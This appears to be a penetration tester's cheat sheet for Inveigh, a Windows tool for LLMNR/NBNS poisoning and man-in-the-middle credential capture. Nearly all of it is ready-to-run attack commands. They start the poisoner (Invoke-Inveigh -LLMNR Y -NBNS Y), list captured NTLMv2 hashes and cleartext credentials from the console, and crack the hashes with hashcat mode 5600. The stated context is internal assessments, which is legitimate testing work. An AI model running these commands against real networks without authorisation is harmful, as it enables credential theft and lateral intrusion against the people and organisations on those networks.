[Inveigh](https://github.com/Kevin-Robertson/Inveigh) is a Windows-based network spoofing and credential capture tool written in PowerShell and C#. It is designed to perform man-in-the-middle style attacks by abusing Windows name resolution protocols and authentication mechanisms.

Primary purpose:

- Capture NTLM authentication attempts
    
- Perform LLMNR and NBNS poisoning
    
- Harvest credentials during internal network assessments
    

---

## C# Version (Recommended)

Execute the compiled binary:

```powershell
.\Inveigh.exe
```

Startup output displays enabled modules.

Example enabled listeners:

- LLMNR packet sniffer
    
- SMB listener (port 445)
    
- HTTP listener (port 80)
    
- LDAP listener (port 389)
    

Indicators:

```
[+] Enabled
[ ] Disabled
```

![](../../Images/Inveigh_usage.png)
#### Interactive Console
Open the interactive management console:

```
Press ESC
```

Display help menu:

```
HELP
```

View captured NTLMv2 hashes:

```
GET NTLMV2
```

Show unique hashes per user:

```
GET NTLMV2UNIQUE
```

List captured usernames:

```
GET NTLMV2USERNAMES
```

View captured cleartext credentials:

```
GET CLEARTEXT
```

Retrieve logs:

```
GET LOG
```

Stop Inveigh:

```
STOP
```

---
## PowerShell Version (Obsolete)

Import module:

```powershell
Import-Module .\Inveigh.ps1
```

View available parameters:

```powershell
(Get-Command Invoke-Inveigh).Parameters
```

Start poisoning with console and file output:

```powershell
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

Stop execution:

```powershell
Stop-Inveigh
```

---

## Offline Password Cracking

Example Hashcat usage:

```bash
hashcat -m 5600 hashes.txt wordlist.txt
```

Mode 5600 corresponds to NTLMv2 challenge-response hashes.
